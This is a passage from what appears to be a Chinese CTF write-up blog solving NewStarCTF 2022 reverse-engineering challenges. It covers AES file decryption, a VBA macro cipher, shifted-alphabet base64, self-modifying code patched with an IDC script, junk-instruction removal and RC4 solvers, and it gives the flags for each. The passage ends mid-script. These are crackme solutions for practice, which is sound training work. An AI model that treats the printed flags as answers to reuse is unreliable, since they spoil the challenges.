<span class="number">256</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$index</span> = <span class="number">0</span>; <span class="variable">$index</span> <span class="operator">-lt</span> <span class="number">16</span>; <span class="variable">$index</span>++) &#123;</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="variable">$key</span>[<span class="variable">$index</span>]</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;,&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">105</span>, <span class="number">192</span>, <span class="number">50</span>, <span class="number">118</span>, <span class="number">175</span>, <span class="number">152</span>, <span class="number">128</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">80</span>, <span class="number">183</span>, <span class="number">37</span>, <span class="number">190</span>, <span class="number">22</span>, <span class="number">242</span>, <span class="number">78</span>]</span><br><span class="line">key = <span class="string">b&#x27;i\xc02v\xaf\x98\x80\x9b\x93P\xb7%\xbe\x16\xf2N&#x27;</span></span><br></pre></td></tr></table></div></figure><p>然后AES对mygift.xlsm.gift文件进行解密</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\74592\\Desktop\\NewStarCTF2022\\week4\\HelpMe\\mygift.xlsm.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">data = file.read()</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;i\xc02v\xaf\x98\x80\x9b\x93P\xb7%\xbe\x16\xf2N&#x27;</span></span><br><span class="line"></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">out = aes.decrypt(data)</span><br><span class="line"></span><br><span class="line">file2 = <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\74592\\Desktop\\NewStarCTF2022\\week4\\HelpMe\\ans.xls&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">file2.write(out)</span><br></pre></td></tr></table></div></figure><p>然后就会生成一个ans.xls文件。题目说是excel工作表就直接加.xls上去了</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205974.png" alt="image-20221011125910800"></p><p>但是文件损坏了，用在线xls修复工具修复后再打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205975.png" alt="image-20221011125948035"></p><p>出现一个数组并且有个宏，猜测有可能是宏里面写了什么东西，Alt + F11打开vba编辑器，发现加密的代码</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205976.png" alt="image-20221011130105675"></p><p>大意是将excel里面是数组按照arr数组里面的顺序和x异或，然后<code>x = (a * x + b) % 255</code>，脚本解密</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">enc = [ <span class="number">62</span>, <span class="number">163</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">149</span>,<span class="number">89</span>,<span class="number">216</span>,  <span class="number">45</span>,</span><br><span class="line">        <span class="number">20</span>, <span class="number">138</span>, <span class="number">220</span>,   <span class="number">8</span>,<span class="number">75</span>,<span class="number">42</span>, <span class="number">135</span>,  <span class="number">93</span>,</span><br><span class="line">       <span class="number">161</span>,  <span class="number">60</span>, <span class="number">115</span>, <span class="number">215</span>, <span class="number">169</span>,<span class="number">66</span>,  <span class="number">32</span>, <span class="number">132</span>,</span><br><span class="line">       <span class="number">141</span>,  <span class="number">21</span>, <span class="number">184</span>,  <span class="number">95</span>, <span class="number">159</span>,  <span class="number">3</span>,<span class="number">121</span>,  <span class="number">91</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr = [   <span class="number">2</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">15</span>,</span><br><span class="line">          <span class="number">5</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">23</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">9</span>,</span><br><span class="line">          <span class="number">7</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">1</span>, <span class="number">26</span>, <span class="number">30</span>, <span class="number">31</span>,</span><br><span class="line">         <span class="number">27</span>, <span class="number">25</span>,  <span class="number">3</span>, <span class="number">28</span>,  <span class="number">8</span>, <span class="number">22</span>, <span class="number">17</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">a = <span class="number">20</span></span><br><span class="line">b = <span class="number">22</span></span><br><span class="line">x = <span class="number">21</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    tmp = enc[arr[i]]</span><br><span class="line">    tmp = tmp ^ x</span><br><span class="line">    x = (a * x + b) % <span class="number">255</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(tmp&amp;<span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;This_is_@_begin_about@hack&#125;</span><br></pre></td></tr></table></div></figure>        <h1 id="Week5"   >          <a href="#Week5" class="heading-link"><i class="fas fa-link"></i></a><a href="#Week5" class="headerlink" title="Week5"></a>Week5</h1>              <h2 id="拔丝溜肆"   >          <a href="#拔丝溜肆" class="heading-link"><i class="fas fa-link"></i></a><a href="#拔丝溜肆" class="headerlink" title="拔丝溜肆"></a>拔丝溜肆</h2>      <p>64位ida无壳</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205977.png" alt="image-20221017225121337"></p><p>记住这个<code>srand(114514)</code></p><p>点进base64plus函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205978.png" alt="image-20221017225219365"></p><p>发现在基本的base64上还多了个函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205979.png" alt="image-20221017225240067"></p><p>这里每次循环都生成一个随机数然后让key，即码表整体向右循环位移</p><p>随机数种子则是之前出现过的114514</p><p>写脚本得出随机数</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">114514</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d, &quot;</span>, <span class="built_in">rand</span>()%<span class="number">64</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// randnum = &#123;41, 40, 57, 10, 62, 30, 59, 25, 12, 0, 46, 58, 1, 24&#125;</span></span><br></pre></td></tr></table></div></figure><p>然后只要在base64解码的时候加入码表移动就好了</p><p><del>当然也可以解码14次只取对应位置的三个字符</del></p><p>flag{12573882-1CF1-EB5E-C965-035B1F263C38}</p>        <h2 id="E4sy-Mix"   >          <a href="#E4sy-Mix" class="heading-link"><i class="fas fa-link"></i></a><a href="#E4sy-Mix" class="headerlink" title="E4sy_Mix"></a>E4sy_Mix</h2>      <p>ida32位无壳</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205980.png" alt="image-20221017224048755"></p><p>SMC自修改，使用idc脚本</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x402000</span>;</span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">53</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">PatchByte</span>(addr+i,<span class="built_in">Byte</span>(addr+i)^<span class="number">0x54</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205981.png" alt="image-20221017224154988"></p><p>分析之后发现第一个函数只是单纯的初始化一个key数组</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205982.png" alt="image-20221017224238012"></p><p>下断点动调后对着抄跑一边就行了</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line"> <span class="number">161</span>, <span class="number">191</span>, <span class="number">182</span>, <span class="number">112</span>,  <span class="number">99</span>,  <span class="number">91</span>,  <span class="number">59</span>, <span class="number">237</span>, <span class="number">244</span>, <span class="number">145</span>,</span><br><span class="line">  <span class="number">129</span>, <span class="number">164</span>, <span class="number">189</span>,  <span class="number">58</span>,  <span class="number">83</span>, <span class="number">134</span>,  <span class="number">91</span>, <span class="number">140</span>, <span class="number">219</span>,  <span class="number">65</span>,</span><br><span class="line">   <span class="number">27</span>, <span class="number">115</span>, <span class="number">225</span>, <span class="number">209</span>, <span class="number">242</span>, <span class="number">178</span>, <span class="number">223</span>, <span class="number">110</span>,  <span class="number">22</span>,  <span class="number">86</span>,</span><br><span class="line">   <span class="number">34</span>,  <span class="number">66</span>, <span class="number">252</span>]</span><br><span class="line"></span><br><span class="line">key = [</span><br><span class="line">    <span class="number">97</span>, <span class="number">7</span>, <span class="number">213</span>, <span class="number">138</span>, <span class="number">105</span>, <span class="number">120</span>, <span class="number">45</span>, <span class="number">86</span>, <span class="number">209</span>, <span class="number">124</span>,</span><br><span class="line">    <span class="number">30</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">100</span>, <span class="number">48</span>, <span class="number">20</span>, <span class="number">197</span>, <span class="number">60</span>, <span class="number">176</span>,</span><br><span class="line">    <span class="number">55</span>, <span class="number">65</span>, <span class="number">28</span>, <span class="number">23</span>, <span class="number">106</span>, <span class="number">181</span>, <span class="number">74</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>,</span><br><span class="line">    <span class="number">242</span>, <span class="number">183</span>, <span class="number">56</span>, <span class="number">184</span>, <span class="number">123</span>, <span class="number">159</span>, <span class="number">72</span>, <span class="number">127</span>, <span class="number">229</span>, <span class="number">210</span>,</span><br><span class="line">    <span class="number">168</span>, <span class="number">238</span>, <span class="number">179</span>, <span class="number">47</span>, <span class="number">193</span>, <span class="number">90</span>, <span class="number">206</span>, <span class="number">11</span>, <span class="number">42</span>, <span class="number">148</span>,</span><br><span class="line">    <span class="number">80</span>, <span class="number">202</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">169</span>, <span class="number">225</span>, <span class="number">103</span>, <span class="number">222</span>, <span class="number">40</span>, <span class="number">118</span>,</span><br><span class="line">    <span class="number">49</span>, <span class="number">9</span>, <span class="number">62</span>, <span class="number">226</span>, <span class="number">63</span>, <span class="number">167</span>, <span class="number">32</span>, <span class="number">254</span>, <span class="number">38</span>, <span class="number">66</span>,</span><br><span class="line">    <span class="number">122</span>, <span class="number">217</span>, <span class="number">76</span>, <span class="number">214</span>, <span class="number">99</span>, <span class="number">35</span>, <span class="number">52</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">146</span>,</span><br><span class="line">    <span class="number">171</span>, <span class="number">24</span>, <span class="number">145</span>, <span class="number">59</span>, <span class="number">173</span>, <span class="number">26</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">240</span>, <span class="number">131</span>,</span><br><span class="line">    <span class="number">182</span>, <span class="number">5</span>, <span class="number">119</span>, <span class="number">199</span>, <span class="number">198</span>, <span class="number">142</span>, <span class="number">144</span>, <span class="number">93</span>, <span class="number">25</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">51</span>, <span class="number">27</span>, <span class="number">248</span>, <span class="number">69</span>, <span class="number">172</span>, <span class="number">154</span>, <span class="number">150</span>, <span class="number">166</span>, <span class="number">121</span>, <span class="number">192</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">2</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">16</span>, <span class="number">111</span>, <span class="number">152</span>, <span class="number">223</span>,</span><br><span class="line">    <span class="number">132</span>, <span class="number">10</span>, <span class="number">71</span>, <span class="number">64</span>, <span class="number">19</span>, <span class="number">243</span>, <span class="number">175</span>, <span class="number">18</span>, <span class="number">186</span>, <span class="number">139</span>,</span><br><span class="line">    <span class="number">215</span>, <span class="number">203</span>, <span class="number">155</span>, <span class="number">246</span>, <span class="number">200</span>, <span class="number">156</span>, <span class="number">224</span>, <span class="number">1</span>, <span class="number">91</span>, <span class="number">227</span>,</span><br><span class="line">    <span class="number">162</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">218</span>, <span class="number">46</span>, <span class="number">117</span>, <span class="number">194</span>, <span class="number">116</span>, <span class="number">221</span>, <span class="number">251</span>,</span><br><span class="line">    <span class="number">253</span>, <span class="number">234</span>, <span class="number">161</span>, <span class="number">129</span>, <span class="number">187</span>, <span class="number">101</span>, <span class="number">37</span>, <span class="number">68</span>, <span class="number">216</span>, <span class="number">36</span>,</span><br><span class="line">    <span class="number">57</span>, <span class="number">191</span>, <span class="number">87</span>, <span class="number">13</span>, <span class="number">236</span>, <span class="number">112</span>, <span class="number">252</span>, <span class="number">189</span>, <span class="number">89</span>, <span class="number">75</span>,</span><br><span class="line">    <span class="number">73</span>, <span class="number">134</span>, <span class="number">205</span>, <span class="number">231</span>, <span class="number">115</span>, <span class="number">160</span>, <span class="number">141</span>, <span class="number">29</span>, <span class="number">220</span>, <span class="number">94</span>,</span><br><span class="line">    <span class="number">151</span>, <span class="number">135</span>, <span class="number">201</span>, <span class="number">204</span>, <span class="number">125</span>, <span class="number">126</span>, <span class="number">128</span>, <span class="number">22</span>, <span class="number">188</span>, <span class="number">211</span>,</span><br><span class="line">    <span class="number">235</span>, <span class="number">244</span>, <span class="number">88</span>, <span class="number">81</span>, <span class="number">67</span>, <span class="number">249</span>, <span class="number">207</span>, <span class="number">190</span>, <span class="number">241</span>, <span class="number">102</span>,</span><br><span class="line">    <span class="number">212</span>, <span class="number">247</span>, <span class="number">4</span>, <span class="number">95</span>, <span class="number">33</span>, <span class="number">237</span>, <span class="number">50</span>, <span class="number">174</span>, <span class="number">21</span>, <span class="number">39</span>,</span><br><span class="line">    <span class="number">239</span>, <span class="number">44</span>, <span class="number">233</span>, <span class="number">54</span>, <span class="number">250</span>, <span class="number">92</span>, <span class="number">41</span>, <span class="number">147</span>, <span class="number">53</span>, <span class="number">149</span>,</span><br><span class="line">    <span class="number">232</span>, <span class="number">163</span>, <span class="number">82</span>, <span class="number">110</span>, <span class="number">143</span>, <span class="number">180</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">170</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">58</span>, <span class="number">164</span>, <span class="number">208</span>, <span class="number">79</span>, <span class="number">140</span>, <span class="number">70</span>, <span class="number">34</span>, <span class="number">178</span>, <span class="number">177</span>, <span class="number">137</span>,</span><br><span class="line">    <span class="number">85</span>, <span class="number">158</span>, <span class="number">255</span>, <span class="number">17</span>, <span class="number">196</span>, <span class="number">43</span>, <span class="number">31</span>, <span class="number">230</span>, <span class="number">108</span>, <span class="number">133</span>,</span><br><span class="line">    <span class="number">96</span>, <span class="number">245</span>, <span class="number">153</span>, <span class="number">136</span>, <span class="number">130</span>, <span class="number">84</span>]</span><br><span class="line"></span><br><span class="line">v4 = <span class="number">0</span></span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">33</span>):</span><br><span class="line">    v3 = (v3 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    v5 = key[v3]</span><br><span class="line">    v4 = (v5 + v4) % <span class="number">256</span></span><br><span class="line">    key[v3] = key[v4]</span><br><span class="line">    key[v4] = v5</span><br><span class="line">    flag[i] ^= key[(v5 + key[v3]) % <span class="number">256</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]&amp;<span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;RC4_and_SMC_is_interesting!&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="Petals-Level-Up"   >          <a href="#Petals-Level-Up" class="heading-link"><i class="fas fa-link"></i></a><a href="#Petals-Level-Up" class="headerlink" title="Petals Level Up"></a>Petals Level Up</h2>      <p> 这道题的关键在于花指令</p><p>64位无壳</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205983.png" alt="image-20221101212138136"></p><p>很明显有花指令</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205984.png" alt="image-20221101212217081"></p><p>很明显，最后跳转的地址等于0x1755 + (0xcd ^ 0xc4) &#x3D; 0x175e</p><p>然后将0x173a 到  0x175c这段给nop掉</p><p>类似的还有几个</p><p>最后应该是</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205985.png" alt="image-20221101213002285"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202211012130754.png"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205986.png" alt="image-20221101213044304"></p><p>写出脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="built_in">len</span> = <span class="number">32</span></span><br><span class="line">key = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    key[i] = (~(i ^ <span class="built_in">len</span>)) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0xB3</span>, <span class="number">0x79</span>, <span class="number">0xF1</span>, <span class="number">0x70</span>, <span class="number">0xB3</span>, <span class="number">0x79</span>, <span class="number">0xF1</span>, <span class="number">0x70</span>, <span class="number">0xB3</span>, <span class="number">0x31</span>,</span><br><span class="line">  <span class="number">0xC3</span>, <span class="number">0x6E</span>, <span class="number">0x24</span>, <span class="number">0xE3</span>, <span class="number">0x7C</span>, <span class="number">0xFF</span>, <span class="number">0xDA</span>, <span class="number">0xF9</span>, <span class="number">0x75</span>, <span class="number">0xF2</span>,</span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0xBF</span>, <span class="number">0x33</span>, <span class="number">0xE3</span>, <span class="number">0x65</span>, <span class="number">0xA6</span>, <span class="number">0x62</span>, <span class="number">0x2A</span>, <span class="number">0x65</span>, <span class="number">0x24</span>,</span><br><span class="line">  <span class="number">0xB4</span>, <span class="number">0xBA</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    enc[i] ^= enc[(i + <span class="number">1</span>) % <span class="built_in">len</span>]</span><br><span class="line">    enc[i] ^= <span class="number">0x7A</span></span><br><span class="line">    enc[i] = (enc[i] &lt;&lt; <span class="number">4</span> | enc[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    enc[i] ^= <span class="number">0x64</span></span><br><span class="line">    enc[i] = (enc[i] &gt;&gt; <span class="number">5</span> | enc[i] &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    enc[i] ^= <span class="number">0x73</span></span><br><span class="line">    enc[i] = (enc[i] &gt;&gt; <span class="number">6</span> | enc[i] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    enc[i] ^= <span class="number">0x71</span></span><br><span class="line">    enc[i] = (enc[i] &gt;&gt; <span class="number">7</span> | enc[i] &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    enc[i] = key.index(enc[i])</span><br><span class="line">    flag += <span class="built_in">chr</span>(enc[i] &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = hashlib.md5()</span><br><span class="line">a.update((flag).encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span>+a.hexdigest() + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d5658c0b4c44d4672d76b563a8505a66&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="babycode"   >          <a href="#babycode" class="heading-link"><i class="fas fa-link"></i></a><a href="#babycode" class="headerlink" title="babycode"></a>babycode</h2>      <p>.ll 文件是llvm下的字节码的文本形式</p><p>于是我们需要将其转换为可执行文件来进行分析</p><p>将字节码变为汇编后就能用clang编译</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm-as task.ll</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang task.bc -o struct</span><br></pre></td></tr></table></div></figure><p>然后拖进ida进行分析</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205987.png" alt="image-20221104153648189"></p><p>不难但是有几个点是要留意的</p><p>这里输入靠溢出分成了两节，先rc4加密前半节，然后将后16位和前16位异或后再用同一个s盒rc4加密，再整体base64</p><p>rc4是标准的，key &#x3D; <code>llvmbitc</code></p><p>base64坑有点多</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205988.png" alt="image-20221104154113755"></p><p>一个是他3转4是时候顺序不太一样，但是结尾的3转4顺序是正常的</p><p>码表则是以<code>;</code>开头的64位</p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">t = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc_init</span>():</span><br><span class="line">    key = [<span class="number">0x6c</span>, <span class="number">0x6c</span>, <span class="number">0x76</span>, <span class="number">0x6d</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x63</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        s[i] = i</span><br><span class="line">        t[i] = key[i % <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    v3 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        v3 = (t[i] + s[i] + v3) % <span class="number">256</span></span><br><span class="line">        s[i], s[v3] = s[v3], s[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc_decode</span>(<span class="params">enc</span>):</span><br><span class="line">    elen = <span class="built_in">len</span>(enc)</span><br><span class="line">    v4 = <span class="number">0</span></span><br><span class="line">    v5 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(elen):</span><br><span class="line">        v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        v4 = (s[v5] + v4) % <span class="number">256</span></span><br><span class="line">        s[v5], s[v4] = s[v4], s[v5]</span><br><span class="line">        enc[i] ^= s[(s[v4] + s[v5]) % <span class="number">256</span>] ^ <span class="number">0x59</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line">enc = <span class="string">&quot;TSz`kWKgbMHszXaj`@kLBmRrnTxsNtZsSOtZzqYikCw&quot;</span></span><br><span class="line">x = <span class="built_in">len</span>(enc)</span><br><span class="line">keyboard = <span 